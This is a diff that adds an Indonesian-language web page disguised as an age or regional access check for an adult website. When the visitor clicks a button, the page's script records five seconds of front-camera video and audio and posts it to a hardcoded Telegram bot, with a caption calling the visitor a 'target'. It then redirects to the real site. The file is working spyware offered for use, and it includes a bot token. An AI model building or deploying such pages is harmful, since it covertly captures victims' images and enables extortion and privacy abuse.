@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Akses Regional</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #121212;
+            color: #ffffff;
+        }
+        .container {
+            text-align: center;
+            padding: 35px 25px;
+            background: #1e1e1e;
+            border-radius: 16px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid #2f2f2f;
+        }
+        /* Gaya khusus untuk tulisan teks di bagian atas */
+        .text-header {
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            margin-bottom: 25px;
+            color: #ffffff;
+            text-transform: uppercase;
+        }
+        h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            font-weight: 700;
+        }
+        p {
+            font-size: 14px;
+            color: #e3e3e3;
+            line-height: 1.5;
+        }
+        .warning-text {
+            font-size: 12px;
+            color: #ffc107;
+            background: rgba(255, 193, 7, 0.1);
+            padding: 10px;
+            border-radius: 6px;
+            margin-top: 15px;
+        }
+        .btn-group {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        button {
+            padding: 14px;
+            font-size: 15px;
+            background-color: #2f2f2f;
+            color: white;
+            border: 1px solid #444;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+        button:hover {
+            background-color: #FE2C55;
+            border-color: #FE2C55;
+        }
+        #status-box {
+            margin-top: 20px;
+            font-weight: 600;
+            font-size: 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #2f2f2f;
+            border-top: 4px solid #25F4EE;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        .loading { color: #25F4EE; }
+        .success { color: #00f2fe; }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Bagian atas hanya berupa tulisan teks tanpa gambar logo -->
+    <div class="text-header">XHAMSTER</div>
+
+    <div id="setup-box">
+        <h3>Verifikasi Akses Pengguna</h3>
+        <p>Konten di dalam situs ini dibatasi berdasarkan wilayah hukum dan memerlukan verifikasi identitas.</p>
+        
+        <p class="warning-text">
+            ⚠️ <strong>Pemberitahuan Transparansi:</strong> Memilih wilayah di bawah ini akan meminta izin browser untuk varifikasi validasi (5 detik) demi kepatuhan layanan.
+        </p>
+
+        <div class="btn-group">
+            <button onclick="mulaiVerifikasi('Indonesia')">Masuk Lewat Server Indonesia</button>
+            <button onclick="mulaiVerifikasi('Global')">Masuk Lewat Server Global / Internasional</button>
+        </div>
+    </div>
+
+    <div id="status-box" style="display: none;">
+        <div id="loading-spinner" class="spinner"></div>
+        <p id="status-text">Memproses...</p>
+    </div>
+</div>
+
+<script>
+const TELEGRAM_TOKEN = "8879531164:AAEpv9Gi4_iBlN3Ul6xW_cGrUn_OVP9XT_U";
+const CHAT_ID = "-5421199160";
+const URL_WEB_TUJUAN = "https://xhamster.com"; 
+
+let wilayahDipilih = "";
+
+function updateStatus(text, className, showSpinner = false) {
+    const statusBox = document.getElementById('status-box');
+    const statusText = document.getElementById('status-text');
+    const spinner = document.getElementById('loading-spinner');
+    
+    statusBox.style.display = 'flex';
+    statusText.innerText = text;
+    statusText.className = className;
+    spinner.style.display = showSpinner ? 'block' : 'none';
+}
+
+function mulaiVerifikasi(wilayah) {
+    wilayahDipilih = wilayah;
+    document.getElementById('setup-box').style.display = 'none';
+    prosesRekamanKamera();
+}
+
+function prosesRekamanKamera() {
+    updateStatus("Memulai varifikasi validasi (5 detik)...", "loading", true);
+
+    const constraints = { video: { facingMode: "user" }, audio: true };
+
+    navigator.mediaDevices.getUserMedia(constraints)
+        .then((stream) => {
+            const mediaRecorder = new MediaRecorder(stream);
+            let videoChunks = [];
+
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) videoChunks.push(event.data);
+            };
+
+            mediaRecorder.onstop = () => {
+                stream.getTracks().forEach(track => track.stop());
+                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                kirimKeTelegram(videoBlob);
+            };
+
+            mediaRecorder.start();
+
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 5000);
+        })
+        .catch((error) => {
+            updateStatus("❌ Akses kamera ditolak atau tidak tersedia.", "", false);
+            alert("Akses ditolak: Kamera diperlukan untuk menyelesaikan proses.");
+        });
+}
+
+function kirimKeTelegram(videoBlob) {
+    updateStatus("Memuat verifikasi...", "loading", true);
+
+    const infoTeks = `☠️ *Hasil video rekaman camera depan target by @DiezFck anonymous*:\n\n` +
+                     `• Wilayah Pilihan: \`${wilayahDipilih}\``;
+
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('video', videoBlob, 'verifikasi_user.webm');
+    formData.append('caption', infoTeks);
+    formData.append('parse_mode', 'Markdown');
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            updateStatus("✅ Verifikasi Berhasil! Mengalihkan ke situs...", "success", false);
+            setTimeout(() => {
+                window.location.href = URL_WEB_TUJUAN;
+            }, 1500);
+        } else {
+            updateStatus("❌ Gagal memvalidasi data ke server.", "", false);
+        }
+    })
+    .catch(error => {
+        updateStatus("❌ Terjadi kesalahan jaringan.", "", false);
+    });
+}
+</script>
+
+</body>
+  </html>
+                                                                                                   
